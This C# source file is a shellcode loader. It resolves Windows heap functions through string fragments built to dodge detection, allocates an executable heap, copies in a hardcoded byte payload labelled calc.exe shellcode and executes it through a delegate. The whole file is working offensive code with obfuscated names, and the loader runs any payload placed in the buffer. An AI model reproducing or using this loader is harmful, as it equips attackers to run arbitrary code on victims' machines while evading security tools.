using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace DelegRun
{
    internal class Program
    {

        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetModuleHandleA(
             string lpModuleName
            );

        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetProcAddress(
             IntPtr hModule,
             string lpProcName
            );


        public delegate IntPtr cretbyhp(
            uint flOptions, 
            int dwInitialSize,
            int dwMaximumSize);

        public delegate IntPtr aloxbyhp(
            IntPtr hHeap, 
            UInt32 dwFlags, 
            int dwBytes);

        public delegate bool frexbyhp(
            IntPtr hHeap, 
            UInt32 dwFlags, 
            IntPtr lpMem);

        public delegate void zexx();
        static void Main(string[] args)
        {

            //calc.exe Shellcode
            byte[] buf = new byte[220] { 218, 196, 190, 248, 58, 59, 108, 217, 116, 36, 244, 95, 43, 201, 177, 49, 131, 199, 4, 49, 119, 20, 3, 119, 236, 216, 206, 144, 228, 159, 49, 105, 244, 255, 184, 140, 197, 63, 222, 197, 117, 240, 148, 136, 121, 123, 248, 56, 10, 9, 213, 79, 187, 164, 3, 97, 60, 148, 112, 224, 190, 231, 164, 194, 255, 39, 185, 3, 56, 85, 48, 81, 145, 17, 231, 70, 150, 108, 52, 236, 228, 97, 60, 17, 188, 128, 109, 132, 183, 218, 173, 38, 20, 87, 228, 48, 121, 82, 190, 203, 73, 40, 65, 26, 128, 209, 238, 99, 45, 32, 238, 164, 137, 219, 133, 220, 234, 102, 158, 26, 145, 188, 43, 185, 49, 54, 139, 101, 192, 155, 74, 237, 206, 80, 24, 169, 210, 103, 205, 193, 238, 236, 240, 5, 103, 182, 214, 129, 44, 108, 118, 147, 136, 195, 135, 195, 115, 187, 45, 143, 153, 168, 95, 210, 247, 47, 237, 104, 181, 48, 237, 114, 233, 88, 220, 249, 102, 30, 225, 43, 195, 208, 171, 118, 101, 121, 114, 227, 52, 228, 133, 217, 122, 17, 6, 232, 2, 230, 22, 153, 7, 162, 144, 113, 117, 187, 116, 118, 42, 188, 92, 21, 173, 46, 60, 244, 72, 215, 167, 8 };
            int sc_size = buf.Length;

            IntPtr userBaddr = GetModuleHandleA("Kernel32.dll");
       
            IntPtr funccret = GetProcAddress(userBaddr, "He"+"a"+"p"+"Cre"+"a"+"te");
            IntPtr funcalc = GetProcAddress(userBaddr, "H"+"ea"+"pA"+"ll"+"oc");
            IntPtr funcfrex = GetProcAddress(userBaddr, "Hea"+"pF"+"re"+"e");

            //CREATE
            cretbyhp callme_cret = (cretbyhp) Marshal.GetDelegateForFunctionPointer(funccret, typeof(cretbyhp));
            IntPtr hpc = callme_cret(0x00040000, 0, 0x1000);

            //LOCSPAS
            aloxbyhp callme_alc = (aloxbyhp) Marshal.GetDelegateForFunctionPointer(funcalc, typeof(aloxbyhp));
            IntPtr hpa = callme_alc(hpc, 0x00000008, sc_size);

            Marshal.Copy(buf, 0, hpa, sc_size);

            //EXEC
            zexx showspeed = (zexx)Marshal.GetDelegateForFunctionPointer(hpa, typeof(zexx));
            showspeed();

            frexbyhp callme_frexx = (frexbyhp)Marshal.GetDelegateForFunctionPointer(funcfrex, typeof(frexbyhp));
            bool herba = callme_frexx(hpc, 0x00000001, hpa);




        }
    }
}
